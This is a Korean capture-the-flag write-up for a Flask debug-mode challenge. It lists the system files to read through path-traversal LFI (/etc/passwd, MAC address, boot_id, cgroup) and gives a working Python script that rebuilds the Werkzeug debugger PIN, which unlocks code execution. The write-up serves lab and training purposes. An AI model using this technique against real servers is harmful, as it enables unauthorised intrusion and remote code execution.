# 감자탈출 대작전

## Usage
- Flask debug mode를 이용한 웹 취약점 문제
- 접속: `nc {ip} 5005`

## Concept
- Flask debug mode 취약점

## Writeup
1. debug 페이지 접속

2. /usr/local/lib/python3.8/site-packages/werkzeug/debug/__init__.py -> 핀 알고리즘 확인

3. ..%2f로 LFI 및 pin을 위한 각종 정보 수집
    - username = /etc/passwd
    - modname = 구글링
    - Flask = 구글링
    - 경로 = 구글링 or 디버깅 페이지에 바로보임
    - Int로 표현된 Mac주소 = /sys/class/net/eth0/address
    - MAC 주소 변환: https://www.vultr.com/resources/mac-converter
    - boot-id = /proc/sys/kernel/random/boot_id
    - cgroup = /proc/self/cgroup

4. 핀 생성 알고리즘 추출 후 올바른 값 입력 후 핀 생성

5. flag 읽기

### 익스플로잇 코드
```python
import hashlib
from itertools import chain

probably_public_bits = [
    'gamja',
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.8/site-packages/flask/app.py',
]

private_bits = [
    '2485377892354',
    '764ad584-0a5a-45de-bf26-c224b25cc6ef3cf4a1b3ba1d8375f3df210b144057c0a5974fea054f053896dbf2efa699fe1b'
]

h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
    if not bit:
        continue
    if isinstance(bit, str):
        bit = bit.encode("utf-8")
    h.update(bit)
h.update(b"cookiesalt")

cookie_name = f"__wzd{h.hexdigest()[:20]}"

num = None
if num is None:
    h.update(b'pinsalt')
    num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
    for group_size in 5, 4, 3:
        if len(num) % group_size == 0:
            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                         for x in range(0, len(num), group_size))
            break
    else:
        rv = num

print(rv)